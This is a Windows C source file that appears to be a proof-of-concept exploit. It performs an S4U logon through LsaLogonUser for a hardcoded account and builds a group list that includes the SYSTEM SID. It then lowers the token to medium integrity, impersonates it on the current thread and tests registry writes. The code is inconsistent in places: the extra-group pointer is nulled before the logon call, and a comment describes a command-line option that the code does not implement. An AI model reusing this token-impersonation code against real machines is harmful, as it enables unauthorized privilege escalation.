#include <Windows.h>
#include <NTSecAPI.h>
#include <sddl.h>
#include <stdio.h>
#include <tchar.h>
#include <TlHelp32.h>

#include "util.h"
//#include "poptoke.h"

#pragma comment(lib, "Secur32.lib")

#define STATUS_SUCCESS           0
#define EXTRA_SID_COUNT          2

typedef struct _MSV1_0_SET_OPTION {
	MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
	DWORD dwFlag;
	BOOL bUnset;
} MSV1_0_SET_OPTION, *PMSV1_0_SET_OPTION;

HANDLE g_hHeap;

BOOL
GetLogonSID(
_In_ HANDLE hToken,
_Out_ PSID *pLogonSid
)
{
	BOOL bSuccess = FALSE;
	DWORD dwIndex;
	DWORD dwLength = 0;
	PTOKEN_GROUPS pTokenGroups = NULL;

	//
	// Get required buffer size and allocate the TOKEN_GROUPS buffer.
	//
	if (!GetTokenInformation(
		hToken,
		TokenGroups,
		(LPVOID)pTokenGroups,
		0,
		&dwLength
		))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			fprintf(stderr, "GetTokenInformation failed (error: %u).\n", GetLastError());
			goto Error;
		}

		pTokenGroups = (PTOKEN_GROUPS)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, dwLength);
		if (pTokenGroups == NULL)
			goto Error;
	}

	//
	// Get the token group information from the access token.
	//
	if (!GetTokenInformation(
		hToken,
		TokenGroups,
		(LPVOID)pTokenGroups,
		dwLength,
		&dwLength
		))
	{
		fprintf(stderr, "GetTokenInformation failed (error: %u).\n", GetLastError());
		goto Error;
	}

	//
	// Loop through the groups to find the logon SID.
	//
	for (dwIndex = 0; dwIndex < pTokenGroups->GroupCount; dwIndex++)
		if ((pTokenGroups->Groups[dwIndex].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID)
		{
			//
			// Found the logon SID: make a copy of it.
			//
			dwLength = GetLengthSid(pTokenGroups->Groups[dwIndex].Sid);
			*pLogonSid = (PSID)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, dwLength);
			if (*pLogonSid == NULL)
				goto Error;
			if (!CopySid(dwLength, *pLogonSid, pTokenGroups->Groups[dwIndex].Sid))
			{
				goto Error;
			}
			break;
		}

	bSuccess = TRUE;

Error:
	if (bSuccess == FALSE)
	{
		if (*pLogonSid != NULL)
			HeapFree(g_hHeap, 0, *pLogonSid);
	}

	if (pTokenGroups != NULL)
		HeapFree(g_hHeap, 0, pTokenGroups);

	return bSuccess;
}

//
// Set/Unset privilege.
//
BOOL
SetPrivilege(
_In_ HANDLE hToken,
_In_z_ LPCTSTR lpszPrivilege,
_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,             // lookup privilege on local system
		lpszPrivilege,    // privilege to lookup 
		&luid))           // receives LUID of privilege
	{
		fprintf(stderr, "LookupPrivilegeValue failed (error: %u).\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	//
	// Enable the privilege or disable all privileges.
	//
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		fprintf(stderr, "AdjustTokenPrivileges failed (error: %u).\n", GetLastError());
		return FALSE;
	}
	else
	{
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		{
			fprintf(stderr, "The token does not have the specified privilege (%S).\n", lpszPrivilege);
			return FALSE;
		}
		else
		{
			printf("AdjustTokenPrivileges (%S): OK\n", lpszPrivilege);
		}
	}

	return TRUE;
}

VOID
InitLsaString(
_Out_ PLSA_STRING DestinationString,
_In_z_ LPSTR szSourceString
)
{
	USHORT StringSize;

	StringSize = (USHORT)strlen(szSourceString);

	DestinationString->Length = StringSize;
	DestinationString->MaximumLength = StringSize + sizeof(CHAR);
	DestinationString->Buffer = (PCHAR)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, DestinationString->MaximumLength);

	if (DestinationString->Buffer)
	{
		memcpy(DestinationString->Buffer, szSourceString, DestinationString->Length);
	}
	else
	{
		memset(DestinationString, 0, sizeof(LSA_STRING));
	}
}

PBYTE
InitUnicodeString(
_Out_ PUNICODE_STRING DestinationString,
_In_z_ LPWSTR szSourceString,
_In_ PBYTE pbDestinationBuffer
)
{
	USHORT StringSize;

	StringSize = (USHORT)wcslen(szSourceString) * sizeof(WCHAR);
	memcpy(pbDestinationBuffer, szSourceString, StringSize);

	DestinationString->Length = StringSize;
	DestinationString->MaximumLength = StringSize + sizeof(WCHAR);
	DestinationString->Buffer = (PWSTR)pbDestinationBuffer;

	return (PBYTE)pbDestinationBuffer + StringSize + sizeof(WCHAR);
}

int
run_s4u(HANDLE hToken)
{
	BOOL bResult;
	NTSTATUS Status;
	NTSTATUS SubStatus = 0;

	HANDLE hLsa = NULL;
	HANDLE hTokenS4U = NULL;

	OSVERSIONINFO osvi;
	BOOL bIsLocal = TRUE;

	LSA_STRING Msv1_0Name = { 0 };
	LSA_STRING OriginName = { 0 };
	PMSV1_0_S4U_LOGON pS4uLogon = NULL;
	MSV1_0_SET_OPTION SetOption;
	TOKEN_SOURCE TokenSource;
	ULONG ulAuthenticationPackage;
	DWORD dwMessageLength;

	PBYTE pbPosition;

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	PTOKEN_GROUPS pGroups = NULL;
	PSID pLogonSid = NULL;
	PSID pExtraSid = NULL;

	PVOID pvProfile = NULL;
	DWORD dwProfile = 0;
	LUID logonId = { 0 };
	QUOTA_LIMITS quotaLimits;

	LPTSTR szCommandLine = NULL;
	LPTSTR szDomain = TEXT(".");
	LPTSTR szUsername = TEXT("bja");
	TCHAR seps[] = TEXT("\\");
	TCHAR *next_token = NULL;

	TOKEN_MANDATORY_LABEL TIL = { 0 };

	g_hHeap = GetProcessHeap();

	//
	// Get OS version
	//
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

#pragma warning(suppress : 4996; suppress : 28159)
	bResult = GetVersionEx(&osvi);

	if (bResult == FALSE)
	{
		fprintf(stderr, "GetVersionEx failed (error %u).", GetLastError());
		goto End;
	}

	//
	// Get logon SID
	//
	if (!GetLogonSID(hToken, &pLogonSid))
	{
		fprintf(stderr, "Unable to find logon SID.\n");
		goto End;
	}

	//
	// Connect (Untrusted) to LSA
	//
	Status = LsaConnectUntrusted(&hLsa);
	if (Status != STATUS_SUCCESS)
	{
		fprintf(stderr, "LsaConnectUntrusted failed (error 0x%x).", Status);
		hLsa = NULL;
		goto End;
	}

	//
	// Lookup for the MSV1_0 authentication package (NTLMSSP)
	//
	InitLsaString(&Msv1_0Name, MSV1_0_PACKAGE_NAME);
	Status = LsaLookupAuthenticationPackage(hLsa, &Msv1_0Name, &ulAuthenticationPackage);
	if (Status != STATUS_SUCCESS)
	{
		fprintf(stderr, "LsaLookupAuthenticationPackage failed (error 0x%x).", Status);
		hLsa = NULL;
		goto End;
	}

	//
	// Create MSV1_0_S4U_LOGON structure
	//
	dwMessageLength = (DWORD)sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
	pS4uLogon = (PMSV1_0_S4U_LOGON)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, dwMessageLength);
	if (pS4uLogon == NULL)
	{
		fprintf(stderr, "HeapAlloc failed (error %u).", GetLastError());
		goto End;
	}

	pS4uLogon->MessageType = MsV1_0S4ULogon;
	pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
	pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
	pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);

	//
	// Misc
	//
	strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
	InitLsaString(&OriginName, "S4U for Windows");
	AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);

	//
	// Add extra SID to token.
	//
	// If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
	//
	pGroups = (PTOKEN_GROUPS)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
	if (pGroups == NULL)
	{
		fprintf(stderr, "HeapAlloc failed (error %u).", GetLastError());
		goto End;
	}

	//
	// Add Logon Sid, if present.
	//
	if (pLogonSid)
	{
		pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
		pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
		pGroups->GroupCount++;
	}

	//
	// If an extra SID is specified to command line, add it to the pGroups structure.
	//
	WCHAR systemSID[] = L"S-1-5-18";
	ConvertStringSidToSid(systemSID, &pExtraSid);

	pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
	pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
	pGroups->GroupCount++;

	pGroups = NULL;

	//
	// Call LSA LsaLogonUser
	//
	// This call required SeTcbPrivilege privilege:
	//    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
	//    - [2] to add supplemental SID with LocalGroups parameter.
	//    - [3] to use a username with a domain name different from machine name (or '.').
	//
	Status = LsaLogonUser(
		hLsa,
		&OriginName,
		Network,                // Or Batch
		ulAuthenticationPackage,
		pS4uLogon,
		dwMessageLength,
		pGroups,                // LocalGroups
		&TokenSource,           // SourceContext
		&pvProfile,
		&dwProfile,
		&logonId,
		&hTokenS4U,
		&quotaLimits,
		&SubStatus
		);
	if (Status != STATUS_SUCCESS)
	{
		printf("LsaLogonUser failed (error 0x%x).\n", Status);
		goto End;
	}

	WCHAR mediumInt[] = L"S-1-16-8192";
	PSID sid = NULL;

	if (!ConvertStringSidToSid(mediumInt, &sid))
		printf("ConvertStringSidToSid fail!\n");

	TIL.Label.Attributes = SE_GROUP_INTEGRITY;
	TIL.Label.Sid = sid;

	if (SetTokenInformation(hTokenS4U, TokenIntegrityLevel, (void*)&TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(sid)) == 0)
		printf("SetTokenInformationFail: %d\n", GetLastError());

	HANDLE cthread = GetCurrentThread();
	if (SetThreadToken(&cthread, hTokenS4U) == 0){
		printf("SetThreadToken fail! %d\n", GetLastError());
	}
	else{
		printf("Successfully impersonated S4U...\n");
		
		create_registry_entry(0);
		delete_registry_entry(0);
	}

	goto End;

End:
	//
	// Free resources
	//
	if (Msv1_0Name.Buffer)
		HeapFree(g_hHeap, 0, Msv1_0Name.Buffer);
	if (OriginName.Buffer)
		HeapFree(g_hHeap, 0, OriginName.Buffer);
	if (pLogonSid)
		HeapFree(g_hHeap, 0, pLogonSid);
	if (pExtraSid)
		LocalFree(pExtraSid);
	if (pS4uLogon)
		HeapFree(g_hHeap, 0, pS4uLogon);
	if (pGroups)
		HeapFree(g_hHeap, 0, pGroups);
	if (pvProfile)
		LsaFreeReturnBuffer(pvProfile);
	if (hLsa)
		LsaClose(hLsa);
	if (hToken)
		CloseHandle(hToken);
	if (hTokenS4U)
		CloseHandle(hTokenS4U);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return EXIT_SUCCESS;
}